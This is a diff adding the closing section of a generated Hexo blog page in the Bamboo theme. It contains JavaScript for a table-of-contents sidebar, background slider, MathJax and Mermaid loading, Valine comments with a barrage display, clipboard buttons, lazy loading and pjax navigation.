+  <!-- 手机端目录按钮 -->
+  <div id="toc-mobile-btn">
+    <i class="fas fa-list-ul" aria-hidden="true"></i>
+  </div>
+
+
+<script>
+  function closeToc(init) {
+    $(".toc-aside").css({'width': 0, 'padding': 0, 'transition': init ?  'noe' : 'width 0.3s' });
+    $(".toc-content").css({'width': 0});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'none'});
+    $(".main-content").css({'width': '75%', 'margin': '10px auto'});
+  };
+  function openToc() {
+    $(".main-content").css({'width': '65%', 'margin-right': '10px', 'margin-left': 'calc(35% - 350px)'});
+    $(".toc-aside").css({'width': '300px', 'padding': '0 10px', 'transition': 'width 0.3s'});
+    $(".toc-content").css({'width': '300px'});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'inline-block'});
+  }
+  function openBtnClickFn () {
+    let openOrCloseBtn = $('.toc-aside .toc-aside-title .toc-open-close');
+    let open = eval('' || 'true');
+    openOrCloseBtn.click(function() {
+      if (open) {
+        closeToc();
+        open = false;
+      } else {
+        openToc();
+        open = true;
+      }
+    });
+  };
+  openBtnClickFn();
+  initCloseTocWidth(true);
+
+  function initCloseTocWidth(init) {
+    if (window.innerWidth >= 992) {
+      let isClose = false;
+      isClose && closeToc(init)
+    }
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    $(".toc-aside").css({'transition': 'no'});
+  })
+  document.addEventListener('pjax:complete', function () {
+    openBtnClickFn();
+  })
+  
+</script>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+  <script>
+  // https://github.com/theme-next/hexo-theme-next/blob/master/layout/_third-party/math/mathjax.swig
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3.0/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    // 文章章节标题不能为 “MathJax” ，否则会报错。
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
+
+      </main>
+    </div>
+
+    <!-- 页脚 -->
+    
+  
+  <div class="footer bg-color">
+    <div class="footer-main">
+      
+        
+          <div class="link">
+            
+          </div>
+        
+      
+        
+          <div class="footer-copyright">
+            <p>Copyright © 2019 - 2020 <a target="_blank" rel="noopener" href="https://github.com/yuang01">Deutschball</a> | Powered by <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Deutschball</a> | Theme <a target="_blank" rel="noopener" href="https://github.com/yuang01/theme">Bamboo</a> </p>
+
+          </div>
+        
+      
+        
+          
+        
+      
+        
+          <div class="footer-custom">
+            
+          </div>
+        
+      
+    </div>
+  </div>
+
+<script src='https://unpkg.com/mermaid@/dist/mermaid.min.js'></script>
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({theme: 'forest'});
+  }
+</script>
+
+
+
+
+    <!-- 渲染暗黑按钮 -->
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script src="/js/goTop.js"></script>
+
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="/js/fancybox/jquery.fancybox.min.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <!-- 背景彩带 -->
+    
+      <script type="text/javascript" size="100" alpha='0.4' zIndex="-1" src="/js/ribbon.min.js"></script>
+    
+
+    <script src="/js/utils/index.js"></script>
+    <script src="/js/app.js"></script>
+    
+    <!-- 文章目录所需js -->
+<link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script>
+
+<script>
+  var headerEl = 'h2, h3, h4, h5, h6',  //headers 
+    content = '.post-detail',//文章容器
+    idArr = {};  //标题数组以确定是否增加索引id
+  //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -80,
+    headingsOffset: -($(window).height() * 0.4 - 45),
+    positionFixedSelector: '.toc-main',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    activeLinkClass: 'is-active-link',
+    // onClick: function (e) {},
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    document.addEventListener("DOMContentLoaded", function () {
+      tocbot.init(option);
+      mobileTocClick();
+    });
+
+  }
+
+  window.tocScrollFn = function () {
+    return bamboo.throttle(function () {
+      findHeadPosition();
+    }, 100)()
+  }
+  window.addEventListener('scroll', tocScrollFn);
+
+  const findHeadPosition = function (top) {
+    if ($('.toc-list').length <= 0) {
+      return false;
+    }
+    setTimeout(() => {  // or DOMContentLoaded 
+      autoScrollToc();
+    }, 0);
+  }
+
+  const autoScrollToc = function () {
+    const $activeItem = document.querySelector('.is-active-link');
+    const $cardToc = document.querySelector('.toc-content');
+    const activePosition = $activeItem.getBoundingClientRect().top
+    const sidebarScrollTop = $cardToc.scrollTop
+    if (activePosition > (document.documentElement.clientHeight - 100)) {
+      $cardToc.scrollTop = sidebarScrollTop + 150
+    }
+    if (activePosition < 100) {
+      $cardToc.scrollTop = sidebarScrollTop - 150
+    }
+  }
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+      mobileTocClick();
+    }
+  });
+  
+  // 手机端toc按钮点击出现目录
+  const mobileTocClick = function () {
+    const $cardTocLayout = document.getElementsByClassName('toc-aside')[0];
+    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
+    let right = '45px';
+    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
+      right = '100px'
+    }
+    const mobileToc = {
+      open: () => {
+        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
+      },
+
+      close: () => {
+        $cardTocLayout.style.animation = 'toc-close .2s'
+        setTimeout(() => {
+          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
+        }, 100)
+      }
+    }
+    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
+      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
+      else mobileToc.close()
+    })
+
+    $cardToc.addEventListener('click', (e) => {
+      if (window.innerWidth < 992) { // 小于992px的时候
+        mobileToc.close()
+      }
+    })
+  }
+</script>
+
+<style>
+  .is-position-fixed {
+    position: sticky !important;
+    top: 74px;
+  }
+
+  .toc-main ul {
+    counter-reset: show-list;
+  }
+
+  .toc-main ul li::before {
+    content: counter(item)".";
+    display: block;
+    position: absolute;
+    left: 12px;
+    top: 0;
+  }
+</style> 
+
+<!-- 设置导航背景 -->
+<script>
+  let setHeaderClass = () => {
+    const headerMenuTransparent = true;
+    if (!headerMenuTransparent) { return; }
+    const nav = $('#navHeader');
+    const navTop = nav.outerHeight();
+    const winTop = $(window).scrollTop();
+    if(winTop > navTop) {
+      nav.addClass('header-bg-color');
+    }
+    else {
+      nav.removeClass('header-bg-color');
+    }
+  };
+
+  let scrollCollect = () => {
+    return bamboo.throttle(function (e) {
+      setHeaderClass();
+    }, 200)()
+  }
+
+  let initHeaderBg = () => {
+    setHeaderClass();
+  }
+
+  setHeaderClass();
+  window.addEventListener('scroll', scrollCollect);
+
+  document.addEventListener('pjax:send', function () {
+    window.removeEventListener('scroll', scrollCollect)
+  })
+  document.addEventListener('pjax:complete', function () {
+    window.addEventListener('scroll', scrollCollect);
+    setHeaderClass();
+  })
+</script> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/v-plugs-ayu/lib/ayu.css">
+  <script src="https://cdn.jsdelivr.net/npm/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = 'copy';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+          }
+        })
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "copy that",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+  
+
+<!-- 图片懒加载 -->
+<script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
+
+  
+    <!-- 弹幕所需的css和js -->
+    
+<!-- 具体js，请前往valine/script.ejs查看 -->
+
+    <script>
+  var requiredFields = '';
+  requiredFields = requiredFields.split(',');
+  comment_el = '.comment';
+  let looperValine = null;
+  load_valine = function () {
+    if ($(comment_el).length) {
+      var valine = new Valine({
+        el: '#vcomment',
+        path: window.location.pathname,
+        notify: false,
+        verify: false,
+        app_id: "",
+        app_key: "",
+        placeholder: "客官，说点什么吧",
+        avatar: "",
+        master: "",   //博主邮箱md5
+        tagMeta: ["博主","小伙伴","访客"],     //标识字段名
+        friends: "",
+        metaPlaceholder: { "nick": "昵称/QQ号", "mail": "邮箱" },
+        requiredFields: requiredFields,
+        enableQQ: true,
+      });
+      function debounce(fn) {
+        var timerID = null
+        return function () {
+          var arg = arguments[0]   //获取事件
+          if (timerID) {
+            clearTimeout(timerID)
+          }
+          timerID = setTimeout(function () {
+            fn(arg)              //事件传入函数
+          }, 200)
+        }
+      }
+      //查询评论 valine.Q('*').limit(7) -- 查询所有，限制7条, 下面的的代码是查询当前页面
+      var themeDanmu = eval('false');
+      var themeLoop = eval('false');
+      var themeLooperTime = '5000' || 5000;
+      var speed = '40' || 20;
+      var isBarrager = true;
+      if (themeDanmu == true) {
+        do_barrager();
+        if ($('.danmuBox').length <= 0) {
+          $('.navbar').append('<div class="danmuBox"><div class="danmuBtn open"><span class="danmuCircle"></span><span class="danmuText">弹幕</span></div></div>');
+        }
+        $('.danmuBtn').on('click', debounce(
+          function () {
+            if ($('.danmuBtn').hasClass('open')) {
+              $('.danmuBtn').removeClass('open')
+              clearInterval(looperValine);
+              $.fn.barrager.removeAll();
+            } else {
+              $('.danmuBtn').addClass("open");
+              do_barrager();
+            }
+          }
+        ))
+      }
+      function do_barrager() {
+        isBarrager && valine.Q(window.location.pathname).find().then(function (comments) {
+          // var num = 0; // 可以记录条数，循环调用的时候只取最新的评论放入弹幕中
+          var run_once = true;
+          var looper_time = themeLooperTime;
+          var total = comments.length;
+          // var looper = null;
+          var index = 0;
+          if (total > 0) {
+            barrager();
+          } else {
+            // 当评论数为0的时候，自动关闭弹幕
+            // $('.danmuBtn').removeClass('open');
+          }
+          function barrager() {
+            if (run_once) {
+              //如果是首次执行,则设置一个定时器,并且把首次执行置为false
+              looperValine = setInterval(barrager, looper_time);
+              run_once = false;
+            }
+            var content = comments[index]._serverData.comment;
+            var email = comments[index]._serverData.mail;
+            var link = comments[index]._serverData.link;
+            var newcontent = content.substring(0, 50).replace(/<[^>]+>/g, "");
+            //发布一个弹幕
+            const item = {
+              img: `https://q1.qlogo.cn/g?b=qq&nk=${email}&s=640`, //图片 
+              info: newcontent, //文字 
+              href: link, //链接 
+              close: true, //显示关闭按钮 
+              speed: speed, //延迟,单位秒,默认6 
+              color: '#fff', //颜色,默认白色 
+              old_ie_color: '#000000', //ie低版兼容色,不能与网页背景相同,默认黑色
+            }
+            $('body').barrager(item);
+            //索引自增
+            index++;
+            //所有弹幕发布完毕，清除计时器。
+            if (index == total) {
+              clearInterval(looperValine);
+              if (themeLoop === true) {
+                setTimeout(function () {
+                  do_barrager();
+                }, 5000);
+              } else {
+                $('.danmuBtn').removeClass('open');
+              }
+              return false;
+            }
+
+          }
+        })
+      }
+    }
+  };
+  $(document).ready(load_valine);
+  document.addEventListener('pjax:send', function (e) {
+    
+  })
+  document.addEventListener('pjax:complete', function () {
+    load_valine();
+  });
+</script>
+
+  
+
+
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
+
+  
+    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 999; pointer-events: none;" ></canvas>
+    <script src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+    <script src="/js/cursor/explosion.min.js"></script>
+  
+
+
+
+
+
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
+</html>
